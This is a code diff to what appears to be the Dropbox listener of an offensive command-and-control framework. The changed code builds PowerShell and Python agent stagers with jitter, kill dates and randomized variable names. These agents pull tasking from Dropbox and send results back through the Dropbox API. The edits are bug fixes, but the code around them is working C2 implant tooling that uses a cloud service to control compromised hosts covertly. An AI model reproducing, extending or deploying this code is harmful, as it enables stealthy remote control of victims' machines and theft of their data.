@@ -474,7 +474,7 @@ class Listener(object):
             code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
             code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
             code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64DefaultResponse+'"')
+            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64DefaultResponse.decode('UTF-8')+'"')
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
@@ -498,7 +498,7 @@ class Listener(object):
             code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
             code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
             code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
-            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
+            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse.decode('UTF-8')))
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
@@ -548,7 +548,7 @@ class Listener(object):
             $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent", $script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
-            $TaskingsFolder = "%s"
+            $TaskingsFolder = '"""+ taskingsFolder +"""'
             $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($Script:APIToken)")
             $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
             $Data = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData("https://content.dropboxapi.com/2/files/download")
@@ -568,7 +568,7 @@ class Listener(object):
             }
         }
     }
-                """ % (taskingsFolder)
+                """
 
                 sendMessage = """
     $script:SendMessage = {
@@ -593,8 +593,8 @@ class Listener(object):
 
             $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-
-            $ResultsFolder = "%s"
+            
+            $ResultsFolder = '"""+ resultsFolder +"""'
 
             try {
                 # check if the results file is still in the specified location, if so then
@@ -631,7 +631,7 @@ class Listener(object):
             }
         }
     }
-                """ % (resultsFolder)
+                """
                 
                 return updateServers + getTask + sendMessage
 
@@ -1043,7 +1043,7 @@ def send_message(packets=None):
                         listenerName = self.options['Name']['Value']
                         message = "[*] Uploading agent tasks for {} to {}".format(sessionID, taskingFile)
                         signal = json.dumps({
-                            'print': True,
+                            'print': False,
                             'message': message
                         })
                         dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
